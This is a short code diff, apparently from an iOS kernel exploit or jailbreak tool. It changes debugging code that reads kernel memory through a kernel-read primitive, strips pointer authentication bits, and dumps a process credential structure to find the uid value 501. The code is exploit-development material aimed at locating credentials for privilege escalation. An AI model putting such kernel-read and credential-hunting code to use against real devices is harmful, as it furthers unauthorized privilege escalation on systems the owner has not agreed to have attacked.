@@ -758,16 +758,14 @@
         uint64_t rw10raw = early_kread64(ucredRw + 0x10);
         uint64_t rw10 = xpaci(rw10raw);
         [r appendFormat:@"  rw10 raw=0x%016llx → xpaci=0x%016llx\n", rw10raw, rw10];
-        // Dump posix_cred at rw10
-        if (rw10 > 0xffffff0000000000ULL) {  // any kernel VA
-            [r appendFormat:@"  posix_cred dump at 0x%016llx:\n", rw10];
-            for (uint32_t o = 0; o < 0x100; o += 8) {
-                uint64_t q = early_kread64(rw10 + o);
-                [r appendFormat:@"    +0x%02x: 0x%016llx", o, q];
-                if ((uint32_t)q == 501) [r appendString:@"  ★ 501!"];
-                if ((uint32_t)(q >> 32) == 501) [r appendString:@"  ★ 501 (high)!"];
-                [r appendString:@"\n"];
-            }
+        // Also dump ucred itself to find uid
+        [r appendFormat:@"  ucred dump at 0x%016llx:\n", ucred];
+        for (uint32_t o = 0; o < 0x40; o += 8) {
+            uint64_t q = early_kread64(ucred + o);
+            [r appendFormat:@"    +0x%02x: 0x%016llx", o, q];
+            if ((uint32_t)q == 501) [r appendString:@"  ★ 501!"];
+            if ((uint32_t)(q >> 32) == 501) [r appendString:@"  ★ 501 (high)!"];
+            [r appendString:@"\n"];
         }
         int found501 = 0;
         // Scan the posix_cred object at rw10 for 501
